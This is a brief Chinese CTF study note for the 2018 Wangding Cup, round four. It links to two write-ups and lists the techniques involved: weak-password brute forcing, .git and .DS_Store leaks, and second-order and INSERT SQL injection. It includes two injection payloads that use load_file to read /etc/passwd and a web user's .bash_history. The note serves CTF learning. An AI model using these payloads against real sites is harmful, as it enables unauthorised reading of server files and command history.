# WP
[【2018年 网鼎杯CTF 第四场】部分题目WP - 先知社区](https://xz.aliyun.com/t/2667)<br />[网鼎杯 第四场 部分WriteUp](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485187&idx=1&sn=e2b2051337ecbd8510bb85a1d4302a0c&chksm=e89e2fdbdfe9a6cdcae64bd9ef0458468cd91774ec5f00296499a36ebd00ebc19190116b6ea9&mpshare=1&scene=1&srcid=0830ESdKieMYn8MgJ75vMzuw#rd)
# 知识点
弱口令爆破<br />.git信息泄露<br />sql二次注入，insert注入，sql多行注入，hex(load_file("/etc/passwd"))读取文件
```http
payload1：
?category=',content=(select load_file(‘//home/www/.bash_history')),/*&content=*/#

payload2:
category=', content=(select load_file('/etc/passwd'), bo_id='1' ON DUPLICATE KEY UPDATE category='&content=1
```
读取.bash_histoy获取用户输入命令<br />.DS_Store文件泄露查看网址结构

